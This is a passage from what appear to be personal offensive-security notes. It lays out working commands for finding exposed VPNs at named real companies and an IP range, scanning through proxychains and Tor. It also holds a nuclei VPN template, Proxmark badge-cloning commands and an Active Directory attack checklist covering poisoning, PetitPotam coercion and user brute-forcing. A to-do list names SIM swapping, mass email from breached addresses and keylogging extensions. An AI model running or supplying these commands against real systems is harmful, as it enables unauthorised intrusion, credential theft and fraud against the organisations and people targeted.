&quot;$domain&quot;</p><p>done &gt;&gt; domains.txt &amp;&amp; cat domains.txt| sed &#39;s/\.$//; /^$/d&#39; | grep -v &#39;;;&#39; | tee domains.txt</p><p></p><p>This works well, but wont work over self signed certificates sadly:</p><p>cat equinor_subs.alive.txt | httpx -sc -title -mr &quot;\bVpn\b|\bCisco\b|\bCitrix\b|\bForti|forticlient|\Ooutlook\b&quot; -p 80,443,8000,8080,8443 -follow-redirects | tee vpn.txt</p><p></p><p>This does, but wont be able to naturally follow redirects and grab the word-matching from the endsite, if its been redirected. Only works on initial one unfortunately:</p><p>nuclei -no-interactsh -stats -follow-host-redirects -l &quot;test.txt&quot; -o &quot;nuclei-results.txt&quot; -t &quot;./test.yaml&quot; -vv</p><p></p><p>#The Nuclei developers are aware of this limitation and are working on a solution to remove nested callbacks and properly follow redirects, as indicated by the open issue (#4980) and the ongoing work in the &quot;feat-4980-callbacks&quot; branch1.</p><p></p><p>Best workflow &lt;3</p><p>proxychains -q masscan -p0 147.91.0.0/16 --ping --rate=500 | tee pingsweep.txt &amp;&amp; cat pingsweep.txt | cut -d &#39;n&#39; -f 3 | grep -o &#39;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}&#39; | tee ips.txt &amp;&amp; for ip in $(cat ips.txt); do</p><p>    domain=$(proxychains -q dig +short -x $ip)</p><p>    echo &quot;$domain&quot;</p><p>done &gt;&gt; domains.txt &amp;&amp; cat domains.txt| sed &#39;s/\.$//; /^$/d&#39; | grep -v &#39;;;&#39; | tee domains.txt </p><p></p><p>cat ips.txt | httpx -sc -title -fr -silent | tee httpx.log | cut -d &#39;[&#39; -f 1 | tee httpx_ips.clean</p><p>cat domains.txt | httpx -sc -title -fr -silent | tee httpx.log | cut -d &#39;[&#39; -f 1 | tee httpx_domains.clean</p><p></p><p>nuclei -no-interactsh -nh -stats -follow-host-redirects -l &quot;httpx_ips.clean&quot; -o &quot;nuclei-results.txt&quot; -t &quot;/opt/tools/test.yaml&quot; -vv</p><p>nuclei -no-interactsh -nh -stats -follow-host-redirects -l &quot;httpx_domains.clean&quot; -o &quot;nuclei-results.txt&quot; -t &quot;/opt/tools/test.yaml&quot; -vv</p><p></p><p>DOESNT WORK OVER TOR, BE MINDFUL</p><p>rustscan -p 4500,500 -a ips.txt -g -- -sU | tee rust</p></div><div class='page'><a name="Methdology--Initial_Access--VPN--Finding_Exposed_VPNs_928.html"></a><h1 class='title level-4'>Finding Exposed VPNs</h1><br/><p><h2>Mapping out target infrastructure and targeting VPNs. </h2></p><p></p><p>Why do we even care?</p><p>The reason we care is because a VPN is the gateway to their internal network. That is a companies biggest fear. Due to persistance, stealing sensitive data, ransomware etc. Hacking a webapp is likely to be in it&#39;s own seperate network in a DMZ. If you can mao out and exploit their VPNs, it\s game over.   </p><p></p><p>Strategy 1: Map out target infrastructure and find VPNs (ONLY IF SELF HOSTED):</p><p></p><p>Map out targets full IP range first. Find their main domain and simply ping them to get their IP.</p><p>ping testphp.vulnweb.com</p><p></p><p>We can also run reverse dns on IP to see corresponding domain name. </p><p>dig -x 44.228.249.3</p><p></p><p>In output we can easily see this is an EC2 instance hosted in amazon:</p><p>3.249.228.44.in-addr.arpa. 0    IN      PTR     ec2-44-228-249-3.us-west-2.compute.amazonaws.com.</p><p></p><p>Then take that IP and run a whois to see who owns target and get their full IP range to widen the attack surface:</p><p>whois 44.228.249.3</p><p></p><p>Assuming this is self hosted infrastructure, then scan the entire IP range with either nmap or rustscan. I&#39;d recommend rustscan. Much faster.</p><p></p><p>If you&#39;re after VPNs, I&#39;d recommend scanning all Ips in IP range for these ports:<ul><li>UDP 500 for Ike</li><li>UDP 4500 for IPSEC Nat-Traversal Mode</li><li>If port number 443 is open, it is an SSL VPN.</li><li>If port number 3389 is open, it is RDP.</li><li>If port number 22 is open, it&#39;s SSH.</li></ul></p><p></p><p>These are common ports for either VPNs based or UDP based VPNs, and 22 and 3389 is in case of jump boxes for the targeted organization. All valuable data to have if you want to get into the internal network of that company for ethical penetration tests. </p><p></p><p>After this resolve the IPs with dnsx or dig -x and save to a list for domains. And save all IPs elsewhere. You can scan the domains with httpx like shown under, and IPs are better suited for nuclei due to self signed certifcate will likely cause issues for httpx when it comes to exposed VPNs. </p><p></p><p>This technique will not work in scenarious it&#39;s being hosted in by cloudflare or in the cloud as cloud ranges is given to more than just one company. So unlses the company is hosting the infrastructure themselves which some do, be careful with scanning out of scope. Pay close attention to the Netname, OrgName, and Route fields in the whois lookup. </p><p></p><p>Strategy 2: Map out target infrastructure and find VPNs (If not self hosted, but works eitherway):</p><p></p><p>If you have issues downloading tools, you&#39;ll find info at the bottom of this document.</p><p></p><p>Find every passive DNS related domain related to tesla.com</p><p>subfinder -all -silent -d tesla.com | dnsx -silent | tee subdomains.txt</p><p></p><p>Check for sensitive keywords </p><p>grep -Ei &quot;vpn|cisco|citrix|forti|forticlient|Outlook|login&quot; subdomains.txt</p><p></p><p>In this example we found 8 exposed live VPN related domains for tesla.com</p><p>apacvpn.tesla.com</p><p>apacvpn1.tesla.com</p><p>apacvpn2.tesla.com</p><p>cnvpn1.tesla.com</p><p>cnvpn.tesla.com</p><p>vpn2.tesla.com</p><p>vpn1.tesla.com</p><p>vpn3.tesla.com</p><p></p><p>Using httpx to check for more sensitive exposed VPNs, emails, or general login panels in the html response of the page. </p><p>cat subdomains.txt | httpx -sc -title -mr &quot;\bVpn\b|\bCisco\b|\bCitrix\b|\bForti|forticlient|\bOutlook\b|\blogin\b|\bGlobalProtect\b|\bAzureAttend\b&quot; -p 80,443,8000,8080,8443 -follow-redirects | tee vpn.txt</p><p></p><p>httpx has an issue where it won&#39;t accept self signed certificates. This is an issue because a lot of VPNs are exposed with self signed certs. Luckily we have a way around this using Nuclei. </p><p>nuclei -no-interactsh -nh -stats -follow-host-redirects -l &quot;httpx_domains.clean&quot; -o &quot;nuclei-results.txt&quot; -t &quot;/opt/tools/test.yaml&quot; -vv</p><p>Keep in mind “httpx_domains.clean” is the domains and subdomain we want to target, and test.yaml is our nuclei template we will be using.</p><p></p><p>This is a great methodology for finding companies most valuable treasures. Plenty more guides are coming soon.</p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">id</span>: <span style="color:#3ad900;font-weight:400">keyword-checker</span><br /><br /><span style="color:#ff9d00;font-weight:700">info</span>:<br />  <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">VPN Keyword Checker</span><br />  <span style="color:#ff9d00;font-weight:700">author</span>: <span style="color:#3ad900;font-weight:400">Your Name</span><br />  <span style="color:#ff9d00;font-weight:700">severity</span>: <span style="color:#3ad900;font-weight:400">info</span><br />  <span style="color:#ff9d00;font-weight:700">description</span>: <span style="color:#3ad900;font-weight:400">Checks for the presence of VPN-related keywords and URLs in the response body.</span><br />  <span style="color:#ff9d00;font-weight:700">tags</span>: <span style="color:#3ad900;font-weight:400">tech,cisco,vpn,forticlient,forti</span><br /><br /><span style="color:#ff9d00;font-weight:700">requests</span>:<br />  - <span style="color:#ff9d00;font-weight:700">method</span>: <span style="color:#3ad900;font-weight:400">GET</span><br />    <span style="color:#ff9d00;font-weight:700">path</span>:<br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/vpn&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/remote&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/owa&quot;</span><br /><br />    <span style="color:#ff9d00;font-weight:700">redirects</span>: <span style="color:#ff0044;font-weight:400">true</span><br />    <span style="color:#ff9d00;font-weight:700">max-redirects</span>: <span style="color:#ff0044;font-weight:400">4</span><br />    <span style="color:#ff9d00;font-weight:700">matchers</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">word</span><br />        <span style="color:#ff9d00;font-weight:700">words</span>:<br />          - <span style="color:#3ad900;font-weight:400">&quot;Cisco&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;forticlient&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Citrix&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;VPN&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Forti&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Outlook&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;CSCOE&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;GlobalProtect&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;+webvpn+&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;AzureAttend&quot;</span><br /><br />        <span style="color:#ff9d00;font-weight:700">condition</span>: <span style="color:#3ad900;font-weight:400">or</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br /><br />    <span style="color:#ff9d00;font-weight:700">extractors</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">regex</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br />        <span style="color:#ff9d00;font-weight:700">regex</span>:<br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Cisco&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)forticlient&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Citrix&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)VPN&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Forti&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Outlook&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)CSCOE&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)GlobalProtect&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)webvpn&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)AzureAttend&#39;</span><br /><br />  - <span style="color:#ff9d00;font-weight:700">method</span>: <span style="color:#3ad900;font-weight:400">GET</span><br />    <span style="color:#ff9d00;font-weight:700">path</span>:<br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/&quot;</span><br />    <span style="color:#ff9d00;font-weight:700">matchers</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">word</span><br />        <span style="color:#ff9d00;font-weight:700">words</span>:<br />          - <span style="color:#3ad900;font-weight:400">&quot;top.location=window.location;top.location=&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;window.location.href=&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;document.location=&quot;</span><br />          <br />        <span style="color:#ff9d00;font-weight:700">condition</span>: <span style="color:#3ad900;font-weight:400">or</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br /><br />    <span style="color:#ff9d00;font-weight:700">extractors</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">regex</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br />        <span style="color:#ff9d00;font-weight:700">regex</span>:<br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)top.location=window.location;top.location=&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)window.location.href=&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)document.location=&#39;</span></pre></div></p><p></p><p>Setting up tools:</p><p>subfinder:</p><p>apt install subfinder -y</p><p></p><p>DNSX:</p><p>apt install dnsx -y</p><p></p><p>HTTPX:</p><p>rm /usr/bin/httpx</p><p>wget <a href="https://github.com/projectdiscovery/httpx/releases/download/v1.6.9/httpx_1.6.9_linux_amd64.zip">https://github.com/projectdiscovery/httpx/releases/download/v1.6.9/httpx_1.6.9_linux_amd64.zip</a></p><p>unzip httpx_1.6.9_linux_amd64.zip</p><p>cp httpx /usr/bin/httpx</p></div><div class='page'><a name="Methdology--Initial_Access--VPN--Finding_Exposed_VPNs--nuclei_template_for_vpns_929.html"></a><h1 class='title level-5'>nuclei template for vpns</h1><br/><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">id</span>: <span style="color:#3ad900;font-weight:400">keyword-checker</span><br /><br /><span style="color:#ff9d00;font-weight:700">info</span>:<br />  <span style="color:#ff9d00;font-weight:700">name</span>: <span style="color:#3ad900;font-weight:400">VPN Keyword Checker</span><br />  <span style="color:#ff9d00;font-weight:700">author</span>: <span style="color:#3ad900;font-weight:400">Your Name</span><br />  <span style="color:#ff9d00;font-weight:700">severity</span>: <span style="color:#3ad900;font-weight:400">info</span><br />  <span style="color:#ff9d00;font-weight:700">description</span>: <span style="color:#3ad900;font-weight:400">Checks for the presence of VPN-related keywords and URLs in the response body.</span><br />  <span style="color:#ff9d00;font-weight:700">tags</span>: <span style="color:#3ad900;font-weight:400">tech,cisco,vpn,forticlient,forti</span><br /><br /><span style="color:#ff9d00;font-weight:700">requests</span>:<br />  - <span style="color:#ff9d00;font-weight:700">method</span>: <span style="color:#3ad900;font-weight:400">GET</span><br />    <span style="color:#ff9d00;font-weight:700">path</span>:<br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/vpn&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/remote&quot;</span><br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/owa&quot;</span><br /><br />    <span style="color:#ff9d00;font-weight:700">redirects</span>: <span style="color:#ff0044;font-weight:400">true</span><br />    <span style="color:#ff9d00;font-weight:700">max-redirects</span>: <span style="color:#ff0044;font-weight:400">4</span><br />    <span style="color:#ff9d00;font-weight:700">matchers</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">word</span><br />        <span style="color:#ff9d00;font-weight:700">words</span>:<br />          - <span style="color:#3ad900;font-weight:400">&quot;Cisco&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;forticlient&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Citrix&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;VPN&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Forti&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;Outlook&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;CSCOE&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;GlobalProtect&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;+webvpn+&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;AzureAttend&quot;</span><br /><br />        <span style="color:#ff9d00;font-weight:700">condition</span>: <span style="color:#3ad900;font-weight:400">or</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br /><br />    <span style="color:#ff9d00;font-weight:700">extractors</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">regex</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br />        <span style="color:#ff9d00;font-weight:700">regex</span>:<br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Cisco&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)forticlient&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Citrix&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)VPN&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Forti&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)Outlook&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)CSCOE&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)GlobalProtect&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)webvpn&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)AzureAttend&#39;</span><br /><br />  - <span style="color:#ff9d00;font-weight:700">method</span>: <span style="color:#3ad900;font-weight:400">GET</span><br />    <span style="color:#ff9d00;font-weight:700">path</span>:<br />      - <span style="color:#3ad900;font-weight:400">&quot;{{BaseURL}}/&quot;</span><br />    <span style="color:#ff9d00;font-weight:700">matchers</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">word</span><br />        <span style="color:#ff9d00;font-weight:700">words</span>:<br />          - <span style="color:#3ad900;font-weight:400">&quot;top.location=window.location;top.location=&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;window.location.href=&quot;</span><br />          - <span style="color:#3ad900;font-weight:400">&quot;document.location=&quot;</span><br />          <br />        <span style="color:#ff9d00;font-weight:700">condition</span>: <span style="color:#3ad900;font-weight:400">or</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br /><br />    <span style="color:#ff9d00;font-weight:700">extractors</span>:<br />      - <span style="color:#ff9d00;font-weight:700">type</span>: <span style="color:#3ad900;font-weight:400">regex</span><br />        <span style="color:#ff9d00;font-weight:700">part</span>: <span style="color:#3ad900;font-weight:400">response</span><br />        <span style="color:#ff9d00;font-weight:700">regex</span>:<br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)top.location=window.location;top.location=&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)window.location.href=&#39;</span><br />          - <span style="color:#3ad900;font-weight:400">&#39;(?i)document.location=&#39;</span></pre></div></p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Malicous_Browser_Extensions_930.html"></a><h1 class='title level-3'>Malicous Browser Extensions</h1><br/><p><a href="https://www.youtube.com/watch?v=djCHm8SfSd4">https://www.youtube.com/watch?v=djCHm8SfSd4</a></p><p></p><p>keylogger</p></div><div class='page'><a name="Methdology--Initial_Access--FUN_DO_NEXT_YAY_931.html"></a><h1 class='title level-3'>FUN DO NEXT YAY</h1><br/><p><ul><li>Finding exposed vpn endpoints</li><li>Play with evil twin rq wifi hacking. (Mby for fun find out how long dome better antenna could reach) &lt;<a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a>&gt;</li><li>Omg cables(nasty, basically a rubber ducky) (<a href="https://www.youtube.com/watch?v=aBZEvnvPAtk">https://www.youtube.com/watch?v=aBZEvnvPAtk</a> and <a href="https://github.com/hak5/omg-payloads/tree/master">https://github.com/hak5/omg-payloads/tree/master</a> and <a href="https://www.youtube.com/watch?v=pq0K_0ORJkI)">https://www.youtube.com/watch?v=pq0K_0ORJkI)</a></li><li>Sim swapping</li><li>Mass email marketing from breached mails</li><li>node xss revshell</li></ul></p><p>&lt;<a href="https://www.youtube.com/watch?v=FP-Ug0u9DbE">https://www.youtube.com/watch?v=FP-Ug0u9DbE</a>&gt;</p><p>&lt;<a href="https://github.com/shelld3v/JSshell">https://github.com/shelld3v/JSshell</a>&gt;<ul><li>Figure out motw bypasses. (winrar, except office-macros, valid signed certificates)</li><li>beef with mby dns-wifi attacks &lt;<a href="https://www.youtube.com/watch?v=eobdxFLPknM">https://www.youtube.com/watch?v=eobdxFLPknM</a>&gt;</li><li>Play with office macros. Seems to work still somehow. WRONG. USELESS. (doesnt work when MOTW is on.</li><li>Test <a href="https://github.com/spyboy-productions/r4ven">https://github.com/spyboy-productions/r4ven</a> </li><li><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1218-signed-binary-proxy-execution/untitled-9">https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1218-signed-binary-proxy-execution/untitled-9</a></li><li>Play around with email spoofing</li><li>Play around with msix and appx files, and potentially digital signatures </li></ul></p><p>.appinstaller</p><p>.appx</p><p>.appxbundle</p><p>.msix</p><p>.msixbundle</p><p>&lt;<a href="https://www.youtube.com/watch?v=e-8y0UValUw">https://www.youtube.com/watch?v=e-8y0UValUw</a>&gt;</p><p>&lt;<a href="https://redmondmag.com/articles/2024/01/02/microsoft-disables-app-installer-feature-amid-security-concerns.aspx">https://redmondmag.com/articles/2024/01/02/microsoft-disables-app-installer-feature-amid-security-concerns.aspx</a>&gt;<ul><li>DNS and ICMP Tunneling over WAN </li><li>Check if QUIC protocol has usage. 80,443 UDP</li><li>Test Bettercap &lt;<a href="https://www.youtube.com/watch?v=2J3idGxCbuc">https://www.youtube.com/watch?v=2J3idGxCbuc</a>&gt;</li><li>Make a keylogging extension  &lt;<a href="https://www.youtube.com/watch?v=djCHm8SfSd4">https://www.youtube.com/watch?v=djCHm8SfSd4</a>&gt;</li></ul></p><p>&lt;<a href="https://www.youtube.com/watch?v=CCtBhTpx97c">https://www.youtube.com/watch?v=CCtBhTpx97c</a>&gt;<ul><li>Ransmocloud &lt;<a href="https://www.youtube.com/watch?v=e16STDOf-xs">https://www.youtube.com/watch?v=e16STDOf-xs</a>&gt;</li></ul></p></div><div class='page'><a name="Methdology--Initial_Access--Bluetooth-Wifi-Various_Frequencies_945.html"></a><h1 class='title level-3'>Bluetooth/Wifi/Various Frequencies</h1><br/></div><div class='page'><a name="Methdology--Initial_Access--Bluetooth-Wifi-Various_Frequencies--Remote_rubber_ducky_attack_946.html"></a><h1 class='title level-4'>Remote rubber ducky attack</h1><br/><p><a href="https://m.youtube.com/shorts/s2lS9GCUCWQ">https://m.youtube.com/shorts/s2lS9GCUCWQ</a> </p><p><a href="https://github.com/insecurityofthings/jackit">https://github.com/insecurityofthings/jackit</a> </p><p><a href="https://www.bastille.net/research/vulnerabilities/mousejack/affected-devices">https://www.bastille.net/research/vulnerabilities/mousejack/affected-devices</a></p><p><a href="https://www.reddit.com/r/flipperzero/comments/zjj76a/any_success_with_mouse_jack/">https://www.reddit.com/r/flipperzero/comments/zjj76a/any_success_with_mouse_jack/</a></p><p><a href="https://youtu.be/BEUCcRL219k?t=102">https://youtu.be/BEUCcRL219k?t=102</a> blesssss </p><p><a href="https://store.bitcraze.io/collections/kits/products/crazyradio-pa">https://store.bitcraze.io/collections/kits/products/crazyradio-pa</a> (nRF24LU1+)</p><p></p><p></p><p>Get this adapter <a href="https://store.bitcraze.io/collections/kits/products/crazyradio-pa">https://store.bitcraze.io/collections/kits/products/crazyradio-pa</a> (nRF24LU1+)</p><p>Follow steps here: <a href="https://pastebin.com/ecVV3R9i">https://pastebin.com/ecVV3R9i</a></p><p></p></div><div class='page'><a name="Methdology--OSINT_775.html"></a><h1 class='title level-2'>OSINT</h1><br/><p><a href="https://whatsmyname.app/">https://whatsmyname.app/</a></p><p><a href="https://epieos.com/">https://epieos.com/</a></p><p><a href="https://search.illicit.services/">https://search.illicit.services/</a></p><p><a href="https://smartbackgroundchecks.com/">https://smartbackgroundchecks.com/</a></p><p></p><p><a href="https://steamid.uk/">https://steamid.uk/</a></p><p><a href="https://namemc.com/">https://namemc.com/</a></p><p></p><p><a href="https://github.com/jakecreps/poastal">https://github.com/jakecreps/poastal</a></p><p></p></div><div class='page'><a name="Methdology--Physical_858.html"></a><h1 class='title level-2'>Physical</h1><br/></div><div class='page'><a name="Methdology--Physical--on_digital_devices_866.html"></a><h1 class='title level-3'>on digital devices</h1><br/></div><div class='page'><a name="Methdology--Physical--on_digital_devices--HirenBootCD_865.html"></a><h1 class='title level-4'>HirenBootCD</h1><br/><p><a href="https://www.youtube.com/watch?v=iB_d1gvXiws">https://www.youtube.com/watch?v=iB_d1gvXiws</a></p><p><a href="https://www.hirensbootcd.org/">https://www.hirensbootcd.org/</a></p><p></p><p></p><p>This might be able to bypass bitlocker disk encryption</p><p><a href="https://github.com/Push3AX/GrabAccess">https://github.com/Push3AX/GrabAccess</a></p><p><a href="https://www.youtube.com/watch?v=LCCaI4nr484">https://www.youtube.com/watch?v=LCCaI4nr484</a></p><p></p></div><div class='page'><a name="Methdology--Physical--on_digital_devices--Proxmark_3__Badge_Cloning_860.html"></a><h1 class='title level-4'>Proxmark 3 | Badge Cloning</h1><br/><p><span style="color:#3f4043;">Use this for setup:</span></p><p><a href="https://www.youtube.com/watch?v=o6WOTM4D970">https://www.youtube.com/watch?v=o6WOTM4D970</a></p><p></p><p></p><p><a href="https://tomvanveen.eu/cloning-mifare-classic-with-the-proxmark3/">https://tomvanveen.eu/cloning-mifare-classic-with-the-proxmark3/</a></p><p>hf search</p><p>hf mf chk</p><p>hf mf autopwn</p><p></p><p><span style="color:#3f4043;">save eml file &amp; swap cards on pm3. </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">find a hf card now with magic capabilities</span></p><p>hf mf cview</p><p>hf mf cloud -f hf-mf-76D97327-dump.eml</p><p></p></div><div class='page'><a name="Methdology--Physical--on_digital_devices--Rubber_ducky_859.html"></a><h1 class='title level-4'>Rubber ducky</h1><br/><p>I used pico. Follow this and should get it up. Use gpt or cheat sheet for fast payloads.</p><p></p><p><h3>https://github.com/dbisu/pico-ducky</h3></p><p></p></div><div class='page'><a name="Methdology--Physical--locks_and_physical_security_controls_867.html"></a><h1 class='title level-3'>locks and physical security controls</h1><br/></div><div class='page'><a name="Methdology--Physical--locks_and_physical_security_controls--door_bypasses_868.html"></a><h1 class='title level-4'>door bypasses</h1><br/><p><a href="https://www.youtube.com/watch?v=1ciqsCJD3f0&ab_channel=LockPickingLawyer">https://www.youtube.com/watch?v=1ciqsCJD3f0&amp;ab_channel=LockPickingLawyer</a></p><p><a href="https://www.youtube.com/watch?v=U5-qy2tbDG8">https://www.youtube.com/watch?v=U5-qy2tbDG8</a></p><p><a href="https://www.youtube.com/watch?v=wS_C5ay_DZY">https://www.youtube.com/watch?v=wS_C5ay_DZY</a></p><p></p></div><div class='page'><a name="Domain_Dominance_965.html"></a><h1 class='title level-1'>Domain Dominance</h1><br/></div><div class='page'><a name="Domain_Dominance--No_Credentials_966.html"></a><h1 class='title level-2'>No Credentials</h1><br/><p><ul><li>Network scanning (<code>nxc smb</code>, <code>nmap</code>)</li></ul></p><p> • <strong>Intent:</strong> Probe live hosts/ports.</p><p> • <strong>Purpose:</strong> Find vuln hosts without creds.</p><p><ul><li>Find DC IP (<code>nslookup</code>, Kerberos port scan)</li></ul></p><p> • <strong>Intent:</strong> Identify DCs in network.</p><p> • <strong>Purpose:</strong> Establish targets.</p><p><ul><li>Zone transfer (<code>dig axfr</code>)</li></ul></p><p> • <strong>Intent:</strong> Dump DNS zone unauth.</p><p> • <strong>Purpose:</strong> Gather hosts/domain info.</p><p><ul><li>SMB guest access (<code>nxc smb -u &#39;&#39;</code>)</li></ul></p><p> • <strong>Intent:</strong> Connect anonymously.</p><p> • <strong>Purpose:</strong> Loot shares without creds.</p><p><ul><li>LDAP enum (<code>ldapsearch</code>)</li></ul></p><p> • <strong>Intent:</strong> Query LDAP anonymously.</p><p> • <strong>Purpose:</strong> Extract user/DC info.</p><p><ul><li>Enumerate users (<code>nxc smb --users</code>, RID brute)</li></ul></p><p> • <strong>Intent:</strong> Extract user list unauth.</p><p> • <strong>Purpose:</strong> Prep spraying or cracking.</p><p><ul><li>Bruteforce users (<code>kerbrute</code>, <code>krb5-enum-users</code>)</li></ul></p><p> • <strong>Intent:</strong> Test existence of users.</p><p> • <strong>Purpose:</strong> Build user list.</p><p><ul><li>Poisoning (LLMNR, mitm6, ARP)</li></ul></p><p> • <strong>Intent:</strong> Intercept traffic, capture hashes.</p><p> • <strong>Purpose:</strong> Gather creds offline.</p><p><ul><li>Coerce SMB (PetitPotam unauth)</li></ul></p><p> • <strong>Intent:</strong> Force DC to auth to attacker.</p><p> • <strong>Purpose:</strong> Harvest NTLM.</p><p><ul><li>PXE attacks (<code>pxethief</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse PXE boot creds.</p><p> • <strong>Purpose:</strong> Loot NAA creds or hashes.</p><p><ul><li>TimeRoasting</li></ul></p><p> • <strong>Intent:</strong> Request service tickets with weak keys.</p><p> • <strong>Purpose:</strong> Crack offline.</p><p></p><p>team</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Scan_Network_983.html"></a><h1 class='title level-3'>Scan Network</h1><br/><p># No Credentials</p><p>## Scan network &gt;&gt;&gt; Vulnerable host [<a href="#Domain_Dominance--Quick_Compromise_967.html">Quick Compromise</a>]</p><p></p><p>nxc smb &lt;ip_range&gt;</p><p></p><p>nmap -sP -p &lt;ip&gt;</p><p></p><p>nmap -Pn -sV --top-ports 50 --open &lt;ip&gt;</p><p></p><p>nmap -Pn --script smb-vuln* -p139,445 &lt;ip&gt;</p><p></p><p>nmap -Pn -sC -sV -oA &lt;output&gt; &lt;ip&gt;</p><p></p><p>nmap -Pn -sC -sV -p- -oA &lt;output&gt; &lt;ip&gt;</p><p></p><p>nmap -sU -sC -sV -oA &lt;output&gt; &lt;ip&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--Find_DC_IP_984.html"></a><h1 class='title level-3'>Find DC IP</h1><br/><p># No Credentials</p><p>## Find DC IP</p><p></p><p>nmcli dev show &lt;interface&gt;</p><p></p><p>nslookup -type=SRV _ldap._tcp.dc._msdcs.&lt;domain&gt;</p><p></p><p>nmap -p 88 --open &lt;ip_range&gt;</p></div><div class='page'><a name="Domain_Dominance--No_Credentials--DNS_Zone_Transfer_985.html"></a><h1 class='title level-3'>DNS Zone Transfer</h1><br/><p># No Credentials</p><p>## 